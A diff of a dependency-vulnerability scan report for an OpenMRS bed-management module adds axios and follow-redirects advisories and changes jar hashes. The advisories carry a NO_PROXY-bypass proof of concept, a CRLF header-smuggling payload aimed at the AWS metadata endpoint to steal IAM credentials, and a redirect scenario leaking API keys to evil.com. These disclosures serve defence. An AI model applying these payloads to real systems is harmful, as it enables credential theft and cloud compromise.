-,"url": "https:\/\/github.com\/advisories\/GHSA-3p68-rc4w-qgx5","name": "https:\/\/github.com\/advisories\/GHSA-3p68-rc4w-qgx5"                    }                ],
-                "vulnerableSoftware": [
- {
-                        "software": { 
-                            "id":"cpe:2.3:a:*:axios:\\<1.15.0:*:*:*:*:*:*:*"
-                        }
                     }                ]
                 }, {
                 "source": "NVD",
@@ -51992,6 +52112,94 @@
                         }
                     }                ]
                 }, {
+                "source": "NVD",
+                "name": "CVE-2025-62718",
+                    "severity" : "MEDIUM",
+                    "cvssv3": {
+                        "baseScore": 9.9
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "LOW"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "CHANGED"
+                        ,"confidentialityImpact": "HIGH"
+                        ,"integrityImpact": "LOW"
+                        ,"availabilityImpact": "LOW"
+                        ,"baseSeverity": "CRITICAL"
+,"exploitabilityScore": "3.9","impactScore": "5.3","version": "3.1"                    },
+                    "cvssv4": {
+                        "vectorString": "CVSS:4.0\/AV:N\/AC:L\/AT:P\/PR:N\/UI:N\/VC:L\/VI:L\/VA:N\/SC:L\/SI:L\/SA:N\/E:X\/CR:X\/IR:X\/AR:X\/MAV:X\/MAC:X\/MAT:X\/MPR:X\/MUI:X\/MVC:X\/MVI:X\/MVA:X\/MSC:X\/MSI:X\/MSA:X\/S:X\/AU:X\/R:X\/V:X\/RE:X\/U:X"
+                        ,"source": "security-advisories@github.com"
+                        ,"type": "Secondary"
+                        ,"version": "4.0"
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "LOW"
+                        ,"attackRequirements": "PRESENT"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"vulnerableSystemConfidentiality": "LOW"
+                        ,"vulnerableSystemIntegrity": "LOW"
+                        ,"vulnerableSystemAvailability": "NONE"
+                        ,"subsequentSystemConfidentiality": "LOW"
+                        ,"subsequentSystemIntegrity": "LOW"
+                        ,"subsequentSystemAvailability": "NONE"
+                        ,"exploitMaturity": "NOT_DEFINED"
+                        ,"confidentialityRequirements": "NOT_DEFINED"
+                        ,"integrityRequirements": "NOT_DEFINED"
+                        ,"availabilityRequirements": "NOT_DEFINED"
+                        ,"modifiedAttackVector": "NOT_DEFINED"
+                        ,"modifiedAttackComplexity": "NOT_DEFINED"
+                        ,"modifiedAttackRequirements": "NOT_DEFINED"
+                        ,"modifiedPrivilegesRequired": "NOT_DEFINED"
+                        ,"modifiedUserInteraction": "NOT_DEFINED"
+                        ,"modifiedVulnerableSystemConfidentiality": "NOT_DEFINED"
+                        ,"modifiedVulnerableSystemIntegrity": "NOT_DEFINED"
+                        ,"modifiedVulnerableSystemAvailability": "NOT_DEFINED"
+                        ,"modifiedSubsequentSystemConfidentiality": "NOT_DEFINED"
+                        ,"modifiedSubsequentSystemIntegrity": "NOT_DEFINED"
+                        ,"modifiedSubsequentSystemAvailability": "NOT_DEFINED"
+                        ,"safety": "NOT_DEFINED"
+                        ,"automatable": "NOT_DEFINED"
+                        ,"recovery": "NOT_DEFINED"
+                        ,"valueDensity": "NOT_DEFINED"
+                        ,"vulnerabilityResponseEffort": "NOT_DEFINED"
+                        ,"providerUrgency": "NOT_DEFINED"
+                        ,"baseScore": 6.3
+                        ,"baseSeverity": "MEDIUM"
+                    },
+                    "cwes": [
+                        "CWE-918",                        "CWE-441"                    ],
+                "description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.31.0, Axios does not correctly handle hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like localhost. (with a trailing dot) or [::1] (IPv6 literal) skip NO_PROXY matching and go through the configured proxy. This goes against what developers expect and lets attackers force requests through a proxy, even if NO_PROXY is set up to protect loopback or internal services. This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections. This vulnerability is fixed in 1.15.0 and 0.31.0.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10688","name": "ISSUE_TRACKING"                    }, {
+                        "source": "134c704f-9b21-4f2e-91b3-4a467353bcc0"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5","name": "EXPLOIT,MITIGATION,VENDOR_ADVISORY"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10661","name": "ISSUE_TRACKING,PATCH"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1","name": "TECHNICAL_DESCRIPTION"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/03cdfc99e8db32a390e12128208b6778492cee9c","name": "PATCH"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0","name": "PRODUCT,RELEASE_NOTES"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2","name": "TECHNICAL_DESCRIPTION"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5","name": "EXPLOIT,MITIGATION,VENDOR_ADVISORY"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df","name": "PATCH"                    }, {
+                        "source": "security-advisories@github.com"
+,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v0.31.0","name": "RELEASE_NOTES"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:axios:axios:*:*:*:*:*:node.js:*:*"
+,"vulnerabilityIdMatched":"true","versionEndExcluding":"1.15.0"                        }
+                    }                ]
+                }, {
                 "source": "NPM",
                 "name": "GHSA-4w2v-q235-vp99",
 "unscored": "true", "severity" : "moderate",
@@ -52039,6 +52247,104 @@
  {
                         "software": { 
                             "id":"cpe:2.3:a:*:axios:\\<0.21.1:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
+                "name": "GHSA-3p68-rc4w-qgx5",
+"unscored": "true", "severity" : "moderate",
+                    "cvssv3": {
+                        "baseScore": 4.800000190734863
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "HIGH"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "LOW"
+                        ,"integrityImpact": "LOW"
+                        ,"availabilityImpact": "NONE"
+                        ,"baseSeverity": "MEDIUM"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-918",                        "CWE-441"                    ],
+                "description": "Axios does not correctly handle hostname normalization when checking `NO_PROXY` rules.\nRequests to loopback addresses like `localhost.` (with a trailing dot) or `[::1]` (IPv6 literal) skip `NO_PROXY` matching and go through the configured proxy.\n\nThis goes against what developers expect and lets attackers force requests through a proxy, even if `NO_PROXY` is set up to protect loopback or internal services.\n\nAccording to [RFC 1034 \u00A73.1](https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1) and [RFC 3986 \u00A73.2.2](https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2), a hostname can have a trailing dot to show it is a fully qualified domain name (FQDN). At the DNS level, `localhost.` is the same as `localhost`. \nHowever, Axios does a literal string comparison instead of normalizing hostnames before checking `NO_PROXY`. This causes requests like `http:\/\/localhost.:8080\/` and `http:\/\/[::1]:8080\/` to be incorrectly proxied.\n\nThis issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections.\n\n---\n\n**PoC**\n\n```js\nimport http from \"http\";\nimport axios from \"axios\";\n\nconst proxyPort = 5300;\n\nhttp.createServer((req, res) => {\n  console.log(\"[PROXY] Got:\", req.method, req.url, \"Host:\", req.headers.host);\n  res.writeHead(200, { \"Content-Type\": \"text\/plain\" });\n  res.end(\"proxied\");\n}).listen(proxyPort, () => console.log(\"Proxy\", proxyPort));\n\nprocess.env.HTTP_PROXY = `http:\/\/127.0.0.1:${proxyPort}`;\nprocess.env.NO_PROXY = \"localhost,127.0.0.1,::1\";\n\nasync function test(url) {\n  try {\n    await axios.get(url, { timeout: 2000 });\n  } catch {}\n}\n\nsetTimeout(async () => {\n  console.log(\"\\n[*] Testing http:\/\/localhost.:8080\/\");\n  await test(\"http:\/\/localhost.:8080\/\"); \/\/ goes through proxy\n\n  console.log(\"\\n[*] Testing http:\/\/[::1]:8080\/\");\n  await test(\"http:\/\/[::1]:8080\/\"); \/\/ goes through proxy\n}, 500);\n```\n\n**Expected:** Requests bypass the proxy (direct to loopback).\n**Actual:** Proxy logs requests for `localhost.` and `[::1]`.\n\n---\n\n**Impact**\n\n* Applications that rely on `NO_PROXY=localhost,127.0.0.1,::1` for protecting loopback\/internal access are vulnerable.\n* Attackers controlling request URLs can:\n\n  * Force Axios to send local traffic through an attacker-controlled proxy.\n  * Bypass SSRF mitigations relying on NO\\_PROXY rules.\n  * Potentially exfiltrate sensitive responses from internal services via the proxy.\n  \n  \n---\n\n**Affected Versions**\n\n* Confirmed on Axios **1.12.2** (latest at time of testing).\n* affects all versions that rely on Axios\u2019 current `NO_PROXY` evaluation.\n\n---\n\n**Remediation**\nAxios should normalize hostnames before evaluating `NO_PROXY`, including:\n\n* Strip trailing dots from hostnames (per RFC 3986).\n* Normalize IPv6 literals by removing brackets for matching.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v0.31.0","name": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v0.31.0"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df","name": "https:\/\/github.com\/axios\/axios\/commit\/fb3befb6daac6cad26b2e54094d0f2d9e47f24df"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2","name": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc3986#section-3.2.2"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10661","name": "https:\/\/github.com\/axios\/axios\/pull\/10661"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2025-62718","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2025-62718"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-3p68-rc4w-qgx5"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10688","name": "https:\/\/github.com\/axios\/axios\/pull\/10688"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1","name": "https:\/\/datatracker.ietf.org\/doc\/html\/rfc1034#section-3.1"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0","name": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/03cdfc99e8db32a390e12128208b6778492cee9c","name": "https:\/\/github.com\/axios\/axios\/commit\/03cdfc99e8db32a390e12128208b6778492cee9c"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-3p68-rc4w-qgx5","name": "https:\/\/github.com\/advisories\/GHSA-3p68-rc4w-qgx5"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:axios:\\<0.31.0:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
+                "name": "GHSA-fvcv-3m26-pcqx",
+"unscored": "true", "severity" : "moderate",
+                    "cvssv3": {
+                        "baseScore": 4.800000190734863
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "HIGH"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "LOW"
+                        ,"integrityImpact": "LOW"
+                        ,"availabilityImpact": "NONE"
+                        ,"baseSeverity": "MEDIUM"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-444",                        "CWE-918",                        "CWE-113"                    ],
+                "description": "# Vulnerability Disclosure: Unrestricted Cloud Metadata Exfiltration via Header Injection Chain\n\n## Summary\nThe Axios library is vulnerable to a specific \"Gadget\" attack chain that allows **Prototype Pollution** in any third-party dependency to be escalated into **Remote Code Execution (RCE)** or **Full Cloud Compromise** (via AWS IMDSv2 bypass).\n\nWhile Axios patches exist for *preventing check* pollution, the library remains vulnerable to *being used* as a gadget when pollution occurs elsewhere. This is due to a lack of HTTP Header Sanitization (CWE-113) combined with default SSRF capabilities.\n\n**Severity**: Critical (CVSS 9.9)\n**Affected Versions**: All versions (v0.x - v1.x)\n**Vulnerable Component**: `lib\/adapters\/http.js` (Header Processing)\n\n## Usage of \"Helper\" Vulnerabilities\nThis vulnerability is unique because it requires **Zero Direct User Input**.\nIf an attacker can pollute `Object.prototype` via *any* other library in the stack (e.g., `qs`, `minimist`, `ini`, `body-parser`), Axios will automatically pick up the polluted properties during its config merge.\n\nBecause Axios does not sanitise these merged header values for CRLF (`\\r\\n`) characters, the polluted property becomes a **Request Smuggling** payload.\n\n## Proof of Concept\n\n### 1. The Setup (Simulated Pollution)\nImagine a scenario where a known vulnerability exists in a query parser. The attacker sends a payload that sets:\n```javascript\nObject.prototype['x-amz-target'] = \"dummy\\r\\n\\r\\nPUT \/latest\/api\/token HTTP\/1.1\\r\\nHost: 169.254.169.254\\r\\nX-aws-ec2-metadata-token-ttl-seconds: 21600\\r\\n\\r\\nGET \/ignore\";\n```\n\n### 2. The Gadget Trigger (Safe Code)\nThe application makes a completely safe, hardcoded request:\n```javascript\n\/\/ This looks safe to the developer\nawait axios.get('https:\/\/analytics.internal\/pings'); \n```\n\n### 3. The Execution\nAxios merges the prototype property `x-amz-target` into the request headers. It then writes the header value directly to the socket without validation.\n\n**Resulting HTTP traffic:**\n```http\nGET \/pings HTTP\/1.1\nHost: analytics.internal\nx-amz-target: dummy\n\nPUT \/latest\/api\/token HTTP\/1.1\nHost: 169.254.169.254\nX-aws-ec2-metadata-token-ttl-seconds: 21600\n\nGET \/ignore HTTP\/1.1\n...\n```\n\n### 4. The Impact (IMDSv2 Bypass)\nThe \"Smuggled\" second request is a valid `PUT` request to the AWS Metadata Service. It includes the required `X-aws-ec2-metadata-token-ttl-seconds` header (which a normal SSRF cannot send).\nThe Metadata Service returns a session token, allowing the attacker to steal IAM credentials and compromise the cloud account.\n\n## Impact Analysis\n-   **Security Control Bypass**: Defeats AWS IMDSv2 (Session Tokens).\n-   **Authentication Bypass**: Can inject headers (`Cookie`, `Authorization`) to pivot into internal administrative panels.\n-   **Cache Poisoning**: Can inject `Host` headers to poison shared caches.\n\n## Recommended Fix\nValidate all header values in `lib\/adapters\/http.js` and `xhr.js` before passing them to the underlying request function.\n\n**Patch Suggestion:**\n```javascript\n\/\/ In lib\/adapters\/http.js\nutils.forEach(requestHeaders, function setRequestHeader(val, key) {\n  if (\/[\\r\\n]\/.test(val)) {\n    throw new Error('Security: Header value contains invalid characters');\n  }\n  \/\/ ... proceed to set header\n});\n```\n\n## References\n-   **OWASP**: CRLF Injection (CWE-113)\n\nThis report was generated as part of a security audit of the Axios library.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v0.31.0","name": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v0.31.0"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10660","name": "https:\/\/github.com\/axios\/axios\/pull\/10660"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10660#issuecomment-4224168081","name": "https:\/\/github.com\/axios\/axios\/pull\/10660#issuecomment-4224168081"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-fvcv-3m26-pcqx","name": "https:\/\/github.com\/advisories\/GHSA-fvcv-3m26-pcqx"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-fvcv-3m26-pcqx","name": "https:\/\/github.com\/axios\/axios\/security\/advisories\/GHSA-fvcv-3m26-pcqx"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/pull\/10688","name": "https:\/\/github.com\/axios\/axios\/pull\/10688"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-40175","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-40175"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/363185461b90b1b78845dc8a99a1f103d9b122a1","name": "https:\/\/github.com\/axios\/axios\/commit\/363185461b90b1b78845dc8a99a1f103d9b122a1"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0","name": "https:\/\/github.com\/axios\/axios\/releases\/tag\/v1.15.0"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/axios\/axios\/commit\/03cdfc99e8db32a390e12128208b6778492cee9c","name": "https:\/\/github.com\/axios\/axios\/commit\/03cdfc99e8db32a390e12128208b6778492cee9c"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:axios:\\<0.31.0:*:*:*:*:*:*:*"
                         }
                     }                ]
                 }            ]        },{
@@ -54208,9 +54514,9 @@
             "isVirtual": false,
             "fileName": "bedmanagement-7.3.0-SNAPSHOT-javadoc.jar",
             "filePath": "\/github\/workspace\/omod\/target\/bedmanagement-7.3.0-SNAPSHOT-javadoc.jar"
-,"md5": "90465a697593f29cb6539850fcb36988",
-            "sha1": "911c2dc0f70ac3165ae40d4bf942e6f688c055e0",
-            "sha256": "e8b344cba736a42e83e071470d2a3be62d814075031e3b72b904378dd6b5764d"            ,"evidenceCollected": {
+,"md5": "5fec38242e3ce566c1ae8e7bd727dc56",
+            "sha1": "1c6a61229654d95286d29da3ce1f3a11547d5c6f",
+            "sha256": "91340c63bcd25ad34c2d9408c15fdd3b048eae24a30a1a75561f29ae2bc2fecf"            ,"evidenceCollected": {
                 "vendorEvidence": [
 {
                             "type": "vendor",
@@ -54337,9 +54643,9 @@
             "isVirtual": false,
             "fileName": "bedmanagement-7.3.0-SNAPSHOT.jar",
             "filePath": "\/github\/workspace\/omod\/target\/bedmanagement-7.3.0-SNAPSHOT.jar"
-,"md5": "96db876d3d1321f3904c40386405a259",
-            "sha1": "5ddd50be27c51dde760e0d0a18463cb45e4056fa",
-            "sha256": "34f9fc7d713db2615305d72c625b9f4098f9377f49eed0f78d7c0ed21961b7c4"            ,"evidenceCollected": {
+,"md5": "4a53f9d842471d1392c96623bd053aea",
+            "sha1": "e27380b0f03ff1992d6ec3ae1213f2e8e55bdc98",
+            "sha256": "4e5f16827052c1a1efe3dd507ff5e1568421a7cd41e68443c9c55eb78cdfa03b"            ,"evidenceCollected": {
                 "vendorEvidence": [
 {
                             "type": "vendor",
@@ -54450,9 +54756,9 @@
             "isVirtual": false,
             "fileName": "bedmanagement-api-7.3.0-SNAPSHOT-javadoc.jar",
             "filePath": "\/github\/workspace\/api\/target\/bedmanagement-api-7.3.0-SNAPSHOT-javadoc.jar"
-,"md5": "831da5f4e3f0a3e6040bfc2b7f954808",
-            "sha1": "8d29f09d6c39e5129dc3c078fdb9176f07be96db",
-            "sha256": "379189615e4deba90082d76d1c205a2989a8550e6375dae91c1d263457a129f7"            ,"evidenceCollected": {
+,"md5": "cdfd425511b579e95421684d03f93a7c",
+            "sha1": "1079fc07e80d26aa10f1c3e0e49b7258a4277590",
+            "sha256": "bbe78a13329dd6efcbe53b1bddeb8c5c903e71aa4621e1ac7bde4600c7c2603c"            ,"evidenceCollected": {
                 "vendorEvidence": [
 {
                             "type": "vendor",
@@ -54550,24 +54856,24 @@
             "isVirtual": false,
             "fileName": "bedmanagement-api-7.3.0-SNAPSHOT.jar",
             "filePath": "\/github\/workspace\/api\/target\/bedmanagement-api-7.3.0-SNAPSHOT.jar"
-,"md5": "7e8123d17b3d31d44afbf280c15de9fc",
-            "sha1": "2aefd3ffacd2e194d4967f48fadf3cddc3a19e97",
-            "sha256": "1a85d5c0cb9734b16c89c2784a3849a8993a949e176778ec2e36005ec34f7dd8","description": "API project for bed-management"            ,"relatedDependencies": [
+,"md5": "85d217e49a15e29deef0d2ae2cb7d47d",
+            "sha1": "0b24ab69d75617e48feca8e2b46b4b1e7675881d",
+            "sha256": "294c16643de7f713a5d2d960f8194559643b08a85d8e5187853bae437bc52f2c","description": "API project for bed-management"            ,"relatedDependencies": [
   {
                     "isVirtual": false,
                     "fileName": "bedmanagement-api-7.3.0-SNAPSHOT.jar",
                     "filePath": "\/github\/workspace\/omod\/target\/bedmanagement-7.3.0-SNAPSHOT\/lib\/bedmanagement-api-7.3.0-SNAPSHOT.jar"
-,"sha256": "1a85d5c0cb9734b16c89c2784a3849a8993a949e176778ec2e36005ec34f7dd8",
-                    "sha1": "2aefd3ffacd2e194d4967f48fadf3cddc3a19e97",
-                    "md5": "7e8123d17b3d31d44afbf280c15de9fc"
+,"sha256": "294c16643de7f713a5d2d960f8194559643b08a85d8e5187853bae437bc52f2c",
+                    "sha1": "0b24ab69d75617e48feca8e2b46b4b1e7675881d",
+                    "md5": "85d217e49a15e29deef0d2ae2cb7d47d"
                 }
  , {
                     "isVirtual": false,
                     "fileName": "bedmanagement-atom-feed-7.3.0-SNAPSHOT.jar",
                     "filePath": "\/github\/workspace\/atom-feed\/target\/bedmanagement-atom-feed-7.3.0-SNAPSHOT.jar"
-,"sha256": "8699c71bbbfa9ae87d4930dfd91d65ab8561f89d08608dc615595a276c8ab0a4",
-                    "sha1": "c3a846adb2f2f8d9f0564ebfdedbcc5c6a4b0329",
-                    "md5": "e57ce463157dc0d76f21515154f169a8",
+,"sha256": "fbcfd971b8e8ae7c3cca1276b94cd409b63a1da48d5ae528b183456b8ebcfbb1",
+                    "sha1": "143c8210cd7a87364dc7f08bec371c266ae8d43b",
+                    "md5": "74be5e8918067e041210433179ac1b03",
                     "packageIds": [
                             {
                                 "id": "pkg:maven/org.openmrs.module/bedmanagement-atom-feed@7.3.0-SNAPSHOT"
@@ -54578,9 +54884,9 @@
                     "isVirtual": false,
                     "fileName": "bedmanagement-atom-feed-7.3.0-SNAPSHOT.jar",
                     "filePath": "\/github\/workspace\/omod\/target\/bedmanagement-7.3.0-SNAPSHOT\/lib\/bedmanagement-atom-feed-7.3.0-SNAPSHOT.jar"
-,"sha256": "8699c71bbbfa9ae87d4930dfd91d65ab8561f89d08608dc615595a276c8ab0a4",
-                    "sha1": "c3a846adb2f2f8d9f0564ebfdedbcc5c6a4b0329",
-                    "md5": "e57ce463157dc0d76f21515154f169a8"
+,"sha256": "fbcfd971b8e8ae7c3cca1276b94cd409b63a1da48d5ae528b183456b8ebcfbb1",
+                    "sha1": "143c8210cd7a87364dc7f08bec371c266ae8d43b",
+                    "md5": "74be5e8918067e041210433179ac1b03"
                 }
             ]
             ,"evidenceCollected": {
@@ -54737,9 +55043,9 @@
             "isVirtual": false,
             "fileName": "bedmanagement-atom-feed-7.3.0-SNAPSHOT-javadoc.jar",
             "filePath": "\/github\/workspace\/atom-feed\/target\/bedmanagement-atom-feed-7.3.0-SNAPSHOT-javadoc.jar"
-,"md5": "313d62dca8153b0c6f46bec1a839f925",
-            "sha1": "45d6904c592a15797ca6a4f0a1a10a67b48c3f41",
-            "sha256": "c24f65ad54a3b87f761ce262fe18f9e7cbfec667c1b6b19df354fa14138c9dfe"            ,"evidenceCollected": {
+,"md5": "0da6b1710c6584f5227bf583fdf98919",
+            "sha1": "2fde0fee2e40b5a95417dd38d8835cf830a85150",
+            "sha256": "1d7cb79a563f201edc63d7e4c9e7d66d1e5e7573b1a3b739b86df4bdd89b3fae"            ,"evidenceCollected": {
                 "vendorEvidence": [
 {
                             "type": "vendor",
@@ -93648,6 +93954,70 @@
             }
 
         },{
+            "isVirtual": true,
+            "fileName": "follow-redirects:1.15.6",
+            "filePath": "\/github\/workspace\/owa\/yarn.lock?follow-redirects"
+            ,"projectReferences": [
+                "yarn.lock: transitive"
+            ]
+            ,"evidenceCollected": {
+                "vendorEvidence": [
+{
+                            "type": "vendor",
+                            "confidence": "HIGH",
+                            "source": "package.json",
+                            "name": "name",
+                            "value": "follow-redirects"
+                        }
+                ],
+                "productEvidence": [
+{
+                            "type": "product",
+                            "confidence": "HIGHEST",
+                            "source": "package.json",
+                            "name": "name",
+                            "value": "follow-redirects"
+                    }
+                ],
+                "versionEvidence": [
+                    {
+                        "type": "version",
+                        "confidence": "HIGHEST",
+                        "source": "package.json",
+                        "name": "version",
+                        "value": "1.15.6"
+                    }
+                ]
+            }
+                ,"packages": [
+                    {
+                        "id": "pkg:npm\/follow-redirects@1.15.6"
+,"confidence": "HIGHEST"                    }
+            ]
+            ,"vulnerabilities": [
+ {
+                "source": "NPM",
+                "name": "GHSA-r4q5-vmmm-2653",
+"unscored": "true", "severity" : "moderate",
+                    "cwes": [
+                        "CWE-200"                    ],
+                "description": "## Summary\n\nWhen an HTTP request follows a cross-domain redirect (301\/302\/307\/308), `follow-redirects` only strips `authorization`, `proxy-authorization`, and `cookie` headers (matched by regex at index.js:469-476). Any custom authentication header (e.g., `X-API-Key`, `X-Auth-Token`, `Api-Key`, `Token`) is forwarded verbatim to the redirect target.\n\nSince `follow-redirects` is the redirect-handling dependency for **axios** (105K+ stars), this vulnerability affects the entire axios ecosystem.\n\n## Affected Code\n\n`index.js`, lines 469-476:\n\n```javascript\nif (redirectUrl.protocol !== currentUrlParts.protocol &&\n   redirectUrl.protocol !== \"https:\" ||\n   redirectUrl.host !== currentHost &&\n   !isSubdomain(redirectUrl.host, currentHost)) {\n  removeMatchingHeaders(\/^(?:(?:proxy-)?authorization|cookie)$\/i, this._options.headers);\n}\n```\n\nThe regex only matches `authorization`, `proxy-authorization`, and `cookie`. Custom headers like `X-API-Key` are not matched.\n\n## Attack Scenario\n\n1. App uses axios with custom auth header: `headers: { 'X-API-Key': 'sk-live-secret123' }`\n2. Server returns `302 Location: https:\/\/evil.com\/steal`\n3. follow-redirects sends `X-API-Key: sk-live-secret123` to `evil.com`\n4. Attacker captures the API key\n\n## Impact\n\nAny custom auth header set via axios leaks on cross-domain redirect. Extremely common pattern. Affects all axios users in Node.js.\n\n## Suggested Fix\n\nAdd a `sensitiveHeaders` option that users can extend, or strip ALL non-standard headers on cross-domain redirect.\n\n## Disclosure\n\nSource code review, manually verified. Found 2026-03-20.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/follow-redirects\/follow-redirects\/security\/advisories\/GHSA-r4q5-vmmm-2653","name": "https:\/\/github.com\/follow-redirects\/follow-redirects\/security\/advisories\/GHSA-r4q5-vmmm-2653"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-r4q5-vmmm-2653","name": "https:\/\/github.com\/advisories\/GHSA-r4q5-vmmm-2653"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/follow-redirects\/follow-redirects\/commit\/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9","name": "https:\/\/github.com\/follow-redirects\/follow-redirects\/commit\/844c4d302ac963d29bdb5dc1754ec7df3d70d7f9"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:follow-redirects:\\<\\=1.15.11:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }            ]        },{
             "isVirtual": false,
             "fileName": "font-family-system-ui.js",
             "filePath": "\/github\/workspace\/owa\/node_modules\/caniuse-lite\/data\/features\/font-family-system-ui.js"
